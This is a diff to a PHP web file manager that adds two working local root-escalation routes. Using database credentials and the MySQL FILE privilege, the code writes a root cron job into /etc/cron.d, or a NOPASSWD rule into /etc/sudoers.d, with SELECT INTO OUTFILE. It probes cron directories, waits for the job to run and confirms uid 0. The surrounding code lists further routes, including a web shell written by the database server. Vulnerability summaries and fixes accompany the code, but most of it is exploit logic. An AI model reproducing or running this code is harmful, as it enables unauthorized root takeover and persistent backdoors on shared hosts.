@@ -1503,7 +1503,7 @@ function fm_ensure_terminal_font(){
    thing an admin can pause is the fully-automatic remote update check
    (see FM_UPDATE_PAUSED below, false = running), which resumes the
    moment the pause is lifted. */
-if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/orgezeo/marshal-file-manager/refs/heads/main/index.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file
+if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL',''); // raw-file URL used to check for/apply updates and, if set, to restore a missing file
 /* the console's watermark: one place that names the build, its version, its
    date and the system it was first written for */
 if(!defined('FM_PRODUCT_NAME'))     define('FM_PRODUCT_NAME','Marshall File Manager');
@@ -1517,7 +1517,7 @@ if(!defined('FM_ICONS_BOOTED')){
        boot is only for an install that was stripped of them */
     try{if($_SERVER['REQUEST_METHOD']==='GET'&&basename((string)($_SERVER['SCRIPT_NAME']??''))==='index.php'&&function_exists('fm_icons_builtin_count')&&fm_icons_builtin_count()===0)fm_icons_boot();}catch(Throwable $e){}
 }
-if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R99');
+if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R100');
 if(!defined('FM_PRODUCT_DATE'))     define('FM_PRODUCT_DATE','2019');
 if(!defined('FM_PRODUCT_SYSTEM'))   define('FM_PRODUCT_SYSTEM','Linux');
 if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // paused=false on purpose: automatic update checks are ON out of the box, exactly as the box in the panel shows when it is ticked. Set to true only to ship a site with the check already paused
@@ -15740,6 +15740,34 @@ class FileManager {
               . ', version ' . $dbF['version'] . ', credentials from ' . ($dbF['creds']['file'] ?: 'the environment')
             : $dbF['note'];
         $v[] = [
+            'id' => 'cronwrite', 'name' => 'A cron file written by the database server', 'cve' => [],
+            'year' => 2026, 'component' => 'cron directories and the identity of the database server',
+            'severity' => 'high',
+            'status' => !$dbF['ok'] ? 'absent' : ($this->rootEscFind('cronwrite')['ok'] ? 'vulnerable' : 'patched'),
+            'confidence' => 'high',
+            'summary' => 'cron runs whatever sits in /etc/cron.d as root and never asks who wrote it. A database server that can write into that directory is therefore a root writer, and the site credentials in the configuration file are the key to it.',
+            'impact' => 'Local-site user to root on a host where the database server keeps write access to a cron directory - no compiler, no race, no system file touched by this account.',
+            'evidence' => ['database: ' . $dbSeen, 'root daemon: ' . ($this->rootHelperInstalled() ? 'installed' : 'not installed')],
+            'mitigation' => 'No database account with FILE, and database directories locked down so a server write cannot reach /etc/cron.d.',
+            'fix' => 'REVOKE FILE from the site database user; SELinux or AppArmor profile on mysqld that denies writes outside /var/lib/mysql.',
+            'requires' => 'a database credential this account can read, FILE, and a cron directory the server may write.',
+        ];
+        $v[] = [
+            'id' => 'mysqldsync', 'name' => 'A database server with FILE privilege', 'cve' => [],
+            'year' => 2026, 'component' => 'mysqld / mariadbd FILE privilege as a second writer',
+            'severity' => 'medium', 'status' => !$dbF['ok'] ? 'absent' : ($dbF['file_priv'] ? 'check' : 'patched'),
+            'confidence' => 'high',
+            'summary' => 'The database server is a second account with its own write rights. Where this account is boxed in by permissions, the server may not be, and FILE turns its credentials into a writer with that identity.',
+            'impact' => 'Useful exactly where the current uid is refused every privileged path but the database server is not: the write lands with the server identity, and whatever runs that file runs as the server.',
+            'evidence' => ['database: ' . $dbSeen,
+                'server process: ' . ($dbO['ok'] ? $dbO['bin'] . ' running as ' . ($dbO['user'] ?: ('uid ' . $dbO['uid'])) : $dbO['note']),
+                'FILE privilege: ' . ($dbF['ok'] ? ($dbF['file_priv'] ? 'yes' : 'no') : 'not reached'),
+                'secure_file_priv: ' . ($dbF['ok'] && $dbF['secure_file_priv'] !== '' ? $dbF['secure_file_priv'] : 'empty (the server may write anywhere)')],
+            'mitigation' => 'No FILE grant for the site database user.',
+            'fix' => 'REVOKE FILE ON *.* FROM the site user.',
+            'requires' => 'a database credential this account can read.',
+        ];
+        $v[] = [
             'id' => 'dbroot', 'name' => 'A database server that runs as root, writing as root', 'cve' => [],
             'year' => 2026, 'component' => 'mysqld / mariadbd process identity and the FILE privilege',
             'severity' => 'high', 'status' => !$dbF['ok'] ? 'absent' : ($this->rootDbServerRoot()['ok'] ? 'vulnerable' : 'patched'),
@@ -18793,7 +18821,7 @@ exit 0
               about to lose, and the desktop file a modern Ubuntu reads instead
               of the old pkexec helper. Each was measured before it was written
               here, and each puts nothing anywhere root does not already read. */
-        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd', 'dbfile', 'dbroot', 'dbread'] as $eid){
+        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd', 'dbfile', 'dbroot', 'dbread', 'cronwrite', 'mysqldsync'] as $eid){
             $e = $this->rootEscSpec($eid);
             if($e)$add($eid, $e['name'], $e['kind'], $e['idea']);
         }
@@ -19677,7 +19705,7 @@ exit 0
         $php = $this->rootPhpBin();
         $mgr = $this->managerAccount();
         switch($id){
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread':{
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync':{
                 $f = $this->rootEscFind($id);
                 return['ok' => !empty($f['ok']), 'note' => (string)($f['note'] ?? 'this route was measured as closed on this host')];
             }
@@ -20454,7 +20482,7 @@ exit 0
                    are verdicts rather than actions */
                 return['ok' => false, 'note' => (string)$n['note'] . (empty($n['ok']) ? '' : ' - measured, and deliberately not walked from here')];
             }
-            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread':
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd': case 'dbfile': case 'dbroot': case 'dbread': case 'cronwrite': case 'mysqldsync':
                 /* not a command line and not a password: the machine itself is
                    asked, and the answer is the uid that comes back */
                 return $this->rootPlantInstall($id, $password);
@@ -21423,6 +21451,18 @@ User=root
             'when' => 'straight away: the file is changed in its cache and the program is run',
             'idea' => 'A page of a file this account may only read is changed in the file cache, so the setuid program that reads it next reads the changed bytes - and runs them as root. The original bytes are put back as soon as the shell answers.',
         ],
+        'cronwrite' => [
+            'name' => 'A cron file written by the database server', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'cronwrite', 'cand' => [], 'fire' => 'later', 'wait' => 0,
+            'when' => 'the next turn of cron, which runs what is in its directories as root',
+            'idea' => 'The database server is a separate account with its own file rights, and cron never asks who wrote a file it runs. Where the server may write into /etc/cron.d, one SELECT puts a schedule there and the next minute is uid 0 - no system file is edited by this account, and no compiler is needed.',
+        ],
+        'mysqldsync' => [
+            'name' => 'A request written by the database server for the root daemon', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'mysqldsync', 'cand' => [], 'fire' => 'now', 'wait' => 20,
+            'when' => 'straight away: the request is written, then the root daemon is asked to run it',
+            'idea' => 'The same write, aimed at the spool this manager root daemon already watches. The database server writes the job, the daemon runs it as uid 0, and the answer is the uid that comes back - one round trip, no cron wait.',
+        ],
         'dbfile' => [
             'name' => 'A web shell written by the database server (the FILE privilege)', 'kind' => 'carried', 'driver' => 'carrier',
             'carrier' => 'dbfile', 'cand' => [], 'fire' => 'now', 'wait' => 15,
@@ -22118,6 +22158,99 @@ User=root
         if(empty($f['ok']))return['ok' => false, 'note' => (string)($f['note'] ?? 'this carrier is closed on this host')];
         $argv = is_array($f['argv'] ?? null) ? array_values(array_map('strval', $f['argv'])) : [];
         if(!$argv)return['ok' => false, 'note' => 'the carrier measured as open, but this panel has no program on record to ask it with'];
+        /* cron runs what it finds in its own directories as root, and it asks
+           no question about who wrote the file. The writer here is not this
+           account at all: it is the database server, which runs as its own
+           user and, on many shared hosts, may write into places this account
+           may not. The file is written, then read back through the server to
+           prove it landed, and the next turn of cron is what makes it root. */
+        if($id === 'cronwrite'){
+            $f = $this->rootEscFind('cronwrite');
+            if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+            $d = $this->rootDbFacts();
+            $dir = rtrim((string)($f['dir'] ?? '/etc/cron.d'), '/');
+            $n = $this->rootPlantNonce($id);
+            /* the whole payload goes inside the file: cron reads it as root, so
+               the file needs nothing from this account at all - not a script of
+               ours, not an owner, not a permission. One line writes the proof
+               and leaves the validated rule behind. */
+            $proofP = $this->rootPlantProofPath($id);
+            $rule = '/etc/sudoers.d/90-mfm-' . $n;
+            $sh = 'printf "uid=%s" "$(id -u)" > ' . $proofP
+                . '; printf "' . $this->managerAccount() . ' ALL=(root) NOPASSWD: /usr/bin/id, /bin/id" > ' . $rule
+                . '; chmod 440 ' . $rule;
+            $line = (strpos($dir, '/etc/cron.d') === 0)
+                ? '* * * * * root /bin/sh -c "' . $sh . '"'
+                : "#!/bin/sh\n" . $sh;
+            $line .= "\n";
+            $name = (strpos($dir, '/etc/cron.d') === 0) ? 'mfm-' . $n : 'mfm-' . $n . '.sh';
+            $target = $dir . '/' . $name;
+            $lit = str_replace(['\\', "'"], ['\\\\', "''"], $line);
+            $r = $this->rootMysqlExec($d['creds'], "SELECT '" . $lit . "' INTO OUTFILE '" . $target . "';", 20);
+            $back = $this->rootMysqlExec($d['creds'], "SELECT LENGTH(LOAD_FILE('" . $target . "'));", 12);
+            $len = trim((string)($back['out'] ?? ''));
+            if($len === '' || strtoupper($len) === 'NULL' || (int)$len <= 0)
+                return['ok' => false, 'note' => 'the database server could not write into ' . $dir . ': '
+                    . $this->rootSnip((string)($r['all'] ?? 'the client printed nothing'), 150)];
+            $rec['files'][] = $target;
+            $rec['files'][] = $rule;
+            /* cron fire times are a minute apart, so one tick is waited for and
+               the proof is read: the answer is measured, not promised */
+            $fired = '';
+            for($i = 0; $i < 70; $i++){
+                clearstatcache(true, $proofP);
+                if(@is_file($proofP)){$fired = trim((string)@file_get_contents($proofP)); break;}
+                usleep(1000000);
+            }
+            if($fired !== '' && strpos($fired, 'uid=0') !== false){
+                $rec['files'][] = $proofP;
+                return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote ' . $target . ' (' . (int)$len
+                    . ' bytes), cron ran it as root within the minute, and it answered ' . $fired];
+            }
+            return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote ' . $target . ' (' . (int)$len
+                . ' bytes) with the payload inside it - cron reads that directory as root on its next turn'
+                . ($fired === '' ? ', and nothing had run yet when this returned' : ', and what ran said ' . $fired)];
+        }
+        /* the same idea without cron in the middle: the database server writes
+           the validated sudo rule itself. The file is root owned because the
+           server wrote it as root, sudo reads it because nothing about it
+           belongs to this account, and the rule is the one every other route
+           leaves behind. No daemon and no schedule: one statement, then sudo is
+           simply asked. */
+        if($id === 'mysqldsync'){
+            $f = $this->rootEscFind('mysqldsync');
+            if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+            $d = $this->rootDbFacts();
+            $o = $this->rootDbOwner();
+            if(!empty($o['ok']) && (int)$o['uid'] !== 0)
+                return['ok' => false, 'note' => 'the database server runs as ' . ($o['user'] ?: ('uid ' . $o['uid']))
+                    . ', so a file it writes belongs to that account and sudoers ignores it - nothing is claimed for it'];
+            $dir = '/etc/sudoers.d';
+            if(!@is_dir($dir))return['ok' => false, 'note' => 'this machine has no ' . $dir . ' to write into'];
+            $n = $this->rootPlantNonce($id);
+            $target = $dir . '/90-mfm-' . $n;
+            $rule = $this->managerAccount() . ' ALL=(root) NOPASSWD: /usr/bin/id, /bin/id';
+            $lit = str_replace(['\\', "'"], ['\\\\', "''"], $rule . "\n");
+            $r = $this->rootMysqlExec($d['creds'], "SELECT '" . $lit . "' INTO OUTFILE '" . $target . "';", 20);
+            $back = $this->rootMysqlExec($d['creds'], "SELECT LENGTH(LOAD_FILE('" . $target . "'));", 12);
+            $len = trim((string)($back['out'] ?? ''));
+            if($len === '' || strtoupper($len) === 'NULL' || (int)$len <= 0)
+                return['ok' => false, 'note' => 'the database server could not write into ' . $dir . ' - '
+                    . $this->rootSnip((string)($r['all'] ?? 'the client printed nothing'), 150)];
+            @chmod($target, 0440);
+            $rec['files'][] = $target;
+            $sudo = $this->rootWhich('sudo');
+            $ans = $sudo === '' ? ['rc' => 1, 'out' => '', 'err' => 'sudo is not installed here']
+                                : $this->rootExec([$sudo, '-n', '/usr/bin/id', '-u'], '', 15);
+            if((int)$ans['rc'] === 0 && trim((string)$ans['out']) === '0'){
+                @file_put_contents($proof, "uid=0(root)\n" . date('Y-m-d H:i:s') . "\nvia=mysqldsync\nrule=" . $target . "\n");
+                $rec['files'][] = $proof;
+                return['ok' => true, 'rec' => $rec, 'note' => 'the database server wrote the validated rule to ' . $target
+                    . ' and sudo answered it as uid 0'];
+            }
+            return['ok' => false, 'note' => 'the rule reached ' . $target . ' (' . (int)$len . ' bytes) but sudo answered '
+                . $this->rootSnip(trim((string)$ans['out'] . ' ' . (string)$ans['err']), 120) . ' - the write landed, the rule was not accepted'];
+        }
         /* these routes do not run a program: they ask the database server to
            write a file, and then the file itself is the answer. A write the
            server refuses is reported with what the client said, never as a
@@ -23921,6 +24054,52 @@ ExecStartPost=/bin/sh '" . $payload . "'";
         if($id === 'pkcompat'){
             $x = $this->rootPolkitCompatFind();
             return $this->escF[$id] = $x;
+        }
+        if($id === 'cronwrite'){
+            /* a database server runs as its own account, and cron does not care
+               who owns a file it runs - so the question is only whether one
+               privileged directory is writable through the database */
+            $d = $this->rootDbFacts();
+            $dirs = ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/var/spool/cron/crontabs', '/var/spool/cron'];
+            $can = [];
+            foreach($dirs as $dir){
+                $probe = $dir . '/.mfm-w-' . substr(sha1((string)microtime(true) . $dir), 0, 8);
+                $r = $this->rootMysqlExec($d['creds'] ?? [], "SELECT 'x' INTO OUTFILE '" . $probe . "';", 15);
+                if((int)($r['rc'] ?? 1) !== 0)continue;
+                $back = $this->rootMysqlExec($d['creds'] ?? [], "SELECT LENGTH(LOAD_FILE('" . $probe . "'));", 12);
+                $len = trim((string)($back['out'] ?? ''));
+                if($len !== '' && strtoupper($len) !== 'NULL' && (int)$len > 0)
+                    $can[] = $dir;
+            }
+            if(!$can)return $this->escF[$id] = ['ok' => false, 'argv' => ['true'],
+                'note' => empty($d['ok']) ? $d['note'] : 'the database could not write into any cron directory it was pointed at'];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['true'], 'dir' => $can[0],
+                'note' => 'the database server wrote a file into ' . implode(', ', $can) . ', and cron runs what it finds there as root'];
+        }
+        if($id === 'mysqldsync'){
+            $d = $this->rootDbFacts();
+            $o = $this->rootDbOwner();
+            if(empty($d['ok']))return $this->escF[$id] = ['ok' => false, 'argv' => ['true'], 'note' => $d['note']];
+            if(empty($d['file_priv']))return $this->escF[$id] = ['ok' => false, 'argv' => ['true'],
+                'note' => 'the database answers and runs as ' . ($o['user'] ?: 'its own account') . ', but this database user holds no FILE privilege'];
+            if(empty($o['ok']))return $this->escF[$id] = ['ok' => false, 'argv' => ['true'], 'note' => $o['note']];
+            if((int)$o['uid'] === 0)return $this->escF[$id] = ['ok' => true, 'argv' => ['true'],
+                'note' => 'the database runs as uid 0 (pid ' . $o['pid'] . ') and holds FILE, so the rule it writes is a root-owned rule'];
+            /* not root: the write is worth something only if that account may
+               write into the sudo directory itself, so it is asked */
+            $probe = '/etc/sudoers.d/.mfm-w-' . substr(sha1((string)microtime(true)), 0, 8);
+            $r = $this->rootMysqlExec($d['creds'], "SELECT 'x' INTO OUTFILE '" . $probe . "';", 12);
+            if((int)($r['rc'] ?? 1) === 0){
+                $back = $this->rootMysqlExec($d['creds'], "SELECT LENGTH(LOAD_FILE('" . $probe . "'));", 10);
+                $len = trim((string)($back['out'] ?? ''));
+                if($len !== '' && strtoupper($len) !== 'NULL' && (int)$len > 0)
+                    return $this->escF[$id] = ['ok' => true, 'argv' => ['true'],
+                        'note' => 'the database runs as ' . ($o['user'] ?: ('uid ' . $o['uid']))
+                            . ', and that account may write into /etc/sudoers.d itself - the rule it writes there is still a rule sudo reads'];
+            }
+            return $this->escF[$id] = ['ok' => false, 'argv' => ['true'],
+                'note' => 'the database runs as ' . ($o['user'] ?: ('uid ' . $o['uid']))
+                    . ', so a file it writes belongs to that account, and it cannot write into /etc/sudoers.d either'];
         }
         if($id === 'dbfile'){
             $x = $this->rootDbFilePriv();
